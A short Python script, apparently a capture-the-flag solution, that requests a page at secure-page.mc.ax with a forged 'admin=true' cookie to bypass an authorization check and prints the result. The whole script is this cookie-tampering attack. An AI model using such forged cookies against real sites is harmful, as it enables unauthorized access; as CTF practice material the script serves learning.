import requests

URL="https://secure-page.mc.ax"

s = requests.Session()

cookies = {"admin": "true"}
res = s.get(URL, cookies=cookies)
print(res.text)